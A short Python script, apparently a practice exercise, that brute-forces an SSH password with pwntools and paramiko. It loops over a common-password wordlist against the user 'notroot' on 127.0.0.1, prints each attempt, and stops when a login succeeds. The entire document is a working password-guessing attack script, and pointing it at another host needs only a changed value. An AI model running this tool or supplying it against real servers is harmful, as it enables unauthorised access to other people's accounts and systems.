#!/bin/python3

from pwn import *
import paramiko

#print("test of bfssh")

# target host IP address
host = "127.0.0.1"

# target credentials - username
username = "notroot"

# used for keeping track of attempts
attempts = 0

# opening a file to read, and using loop to operate on contents
with open("ssh-common-passwords.txt", 'r') as password_list:
    for password in password_list:
        # removing unneeded newlines from passwords
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'...".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            #returning a valid password
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password.")
        attempts += 1